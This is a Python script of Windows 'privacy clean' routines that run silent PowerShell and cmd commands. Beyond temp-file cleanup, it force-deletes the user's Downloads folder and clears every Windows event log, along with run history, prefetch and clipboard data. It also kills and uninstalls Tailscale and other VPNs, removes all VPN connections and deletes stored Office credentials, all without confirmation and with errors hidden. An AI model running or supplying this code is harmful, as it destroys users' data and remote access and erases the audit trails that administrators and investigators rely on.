import os
import shutil
import subprocess
import time

def run_cmd(cmd):
    try:
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def clean_temp():
    run_cmd('powershell -Command "Remove-Item -Path $env:TEMP\\* -Recurse -Force -ErrorAction SilentlyContinue"')

def clean_windows_temp():
    path = "C:\\Windows\\Temp"
    if os.path.exists(path):
        run_cmd(f'powershell -Command "Remove-Item -Path \'{path}\\*\' -Recurse -Force -ErrorAction SilentlyContinue"')

def clean_recycle_bin():
    run_cmd("powershell Clear-RecycleBin -Force")

def clean_prefetch():
    path = "C:\\Windows\\Prefetch"
    if os.path.exists(path):
        run_cmd(f'powershell -Command "Remove-Item -Path \'{path}\\*\' -Recurse -Force -ErrorAction SilentlyContinue"')

def clean_recent():
    recent = os.environ.get("APPDATA") + "\\Microsoft\\Windows\\Recent"
    if os.path.exists(recent):
        run_cmd(f'powershell -Command "Remove-Item -Path \'{recent}\\*\' -Recurse -Force -ErrorAction SilentlyContinue"')

def clean_downloads():
    downloads = os.path.join(os.environ.get("USERPROFILE"), "Downloads")
    if os.path.exists(downloads):
        run_cmd(f'powershell -Command "Remove-Item -Path \'{downloads}\\*\' -Recurse -Force -ErrorAction SilentlyContinue"')

def remove_vpns():
    run_cmd("taskkill /F /IM tailscale.exe /T")
    run_cmd("taskkill /F /IM tailscaled.exe /T")
    run_cmd("taskkill /F /IM NordVPN.exe /T")
    run_cmd("taskkill /F /IM ProtonVPN.exe /T")
    run_cmd("net stop Tailscale /y")

    vpns = ["Tailscale", "NordVPN", "ProtonVPN"]

    for vpn in vpns:
        run_cmd(f"winget uninstall {vpn} --silent --accept-source-agreements")
        run_cmd(f'powershell -Command "$app = Get-WmiObject -Class Win32_Product | Where-Object{{$_.Name -match \'{vpn}\'}}; if($app){{ $app.Uninstall() }}"')

    local_appdata = os.environ.get("LOCALAPPDATA")
    program_data = os.environ.get("PROGRAMDATA")
    if local_appdata and program_data:
        paths_to_clear = [
            os.path.join(local_appdata, "Tailscale"),
            os.path.join(program_data, "Tailscale")
        ]
        for path in paths_to_clear:
            if os.path.exists(path):
                run_cmd(f'powershell -Command "Remove-Item -Path \'{path}\' -Recurse -Force -ErrorAction SilentlyContinue"')

def clean_outlook():
    run_cmd("cmdkey /list | findstr MicrosoftOffice > creds.txt")
    run_cmd("cmdkey /delete:MicrosoftOffice")
    try:
        if os.path.exists("creds.txt"):
            os.remove("creds.txt")
    except:
        pass

def run_deep_privacy_clean():
    run_cmd("ipconfig /flushdns")
    run_cmd('powershell -Command "Clear-Clipboard"')
    run_cmd('cmd.exe /c "echo off | clip"')
    
    run_cmd('powershell -Command "[Windows.ApplicationModel.DataTransfer.Clipboard, Windows, ContentType = WindowsRuntime]::ClearHistory()"')
    
    clipboard_cache = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Windows", "Clipboard")
    if os.path.exists(clipboard_cache):
        run_cmd(f'powershell -Command "Remove-Item -Path \'{clipboard_cache}\\*\' -Recurse -Force -ErrorAction SilentlyContinue"')
    run_cmd('powershell -Command "wevtutil el | Foreach-Object {wevtutil cl $_} 2>$null"')
    run_cmd('powershell -Command "Remove-VpnConnection -Name * -Force -ErrorAction SilentlyContinue"')
    run_cmd('powershell -Command "Clear-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\' -Name * -ErrorAction SilentlyContinue"')
    run_cmd('powershell -Command "Clear-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\' -Name * -ErrorAction SilentlyContinue"')

def run_clean(do_system=True, do_downloads=True, do_vpn=True, do_outlook=True, do_deep=True):
    if do_system:
        clean_temp()
        clean_windows_temp()
        clean_prefetch()
        clean_recycle_bin()
        clean_recent()

    if do_downloads:
        clean_downloads()

    if do_vpn:
        remove_vpns()
        
    if do_outlook:
        clean_outlook()
        
    if do_deep:
        run_deep_privacy_clean()